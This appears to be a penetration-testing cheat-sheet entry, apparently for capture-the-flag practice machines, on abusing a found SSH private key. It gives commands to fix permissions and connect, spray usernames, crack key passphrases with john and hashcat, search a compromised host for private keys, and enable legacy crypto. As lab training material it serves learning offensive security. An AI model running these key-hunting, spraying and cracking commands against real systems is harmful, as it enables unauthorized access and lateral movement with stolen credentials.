title: SSH Key Found — Connect, Crack, or Abuse
body: You have a private key. Before you try to connect, check three things: permissions (chmod 600), that the key isn't passphrase-protected (ssh-keygen -y should print the public key without asking for a passphrase), and which user it belongs to (check the comment at the end of the public key or the filename). The Boolean box pattern: root's private key was stored at /home/remi/.ssh/keys/root — world-readable, used locally with -o IdentitiesOnly=yes to SSH as root.
cmd:
# ══ ⭐ HAVE A PRIVATE KEY? START HERE ══════════════════════════════
chmod 600 id_rsa                          # ALWAYS do this first
ssh-keygen -y -f id_rsa                  # extract public key (fails if corrupt)
# ^ prints: ssh-rsa AAAA... user@host  -> tells you which user + comment

# ══ CONNECT ════════════════════════════════════════════════════════
ssh -i id_rsa -o IdentitiesOnly=yes user@$ip
# -o IdentitiesOnly=yes  <-- CRITICAL: forces SSH to use ONLY this key.
#   Without it: SSH tries every identity in your agent, hits MaxAuthTries,
#   falls through to password prompt. This is the #1 key-auth failure mode.
#   SYMPTOM: key is correct, permissions are right, still prompted for password.
#   FIX: add -o IdentitiesOnly=yes.

# ══ STILL FAILING? ═════════════════════════════════════════════════
# 1) Verbose — see exactly what SSH is trying:
ssh -i id_rsa -o IdentitiesOnly=yes -v user@$ip 2>&1 | grep -iE 'offer|auth|key|deny|identity'
#   'no identity pubkey loaded' -> key is corrupt/incomplete (re-copy it)
#   'Authentications that can continue: password' -> server only allows password
#      (check if pubkey auth is disabled server-side: /etc/ssh/sshd_config)

# 2) Key is ON the box — SSH localhost instead of remote:
ssh -i /home/user/.ssh/keys/root -o IdentitiesOnly=yes root@localhost
#   Bypasses remote auth issues entirely. If you have a shell + a key = try this.

# 3) Wrong username — try other users from /etc/passwd:
for user in $(cat users.txt); do
  ssh -i id_rsa -o IdentitiesOnly=yes $user@$ip -o StrictHostKeyChecking=no 2>/dev/null && echo "HIT: $user"
done

# ══ CRACK PASSPHRASE (if key requires one) ═════════════════════════
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 22921 id_rsa.hash /usr/share/wordlists/rockyou.txt

# ══ FIND KEYS ON A BOX (post-foothold) ════════════════════════════
find /home /root /opt /var/backup /tmp -name 'id_*' -o -name '*.pem' -o -name '*.key' 2>/dev/null
find /home /root -path '*/.ssh/*' -type f 2>/dev/null   # includes keys/ subdirs
ls -la /home/*/.ssh/keys/ 2>/dev/null    # Boolean box pattern: keys/ subdir
# Any readable private key = potential lateral or vertical move.
# Check the comment (last field): root@hostname tells you which user it's for.

# ══ LEGACY CRYPTO (old SSH server: 'no matching host key type') ════
ssh -i id_rsa -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa user@$ip
# Or add permanently to ~/.ssh/config:
# Host <IP>
#     HostKeyAlgorithms +ssh-rsa
#     PubkeyAcceptedKeyTypes +ssh-rsa
#     IdentitiesOnly yes
warn: The #1 SSH key failure: SSH ignores your key and prompts for password. ALWAYS add -o IdentitiesOnly=yes when using a specific key — without it, SSH tries every agent identity and hits MaxAuthTries before your key gets a turn. If the key is on the target box and remote auth fails, SSH localhost from a shell on that box instead. chmod 600 must happen before ANY SSH attempt or the key is silently rejected. ssh-keygen -y failing = key is corrupt (re-copy with scp/cat pipe, not copy-paste).
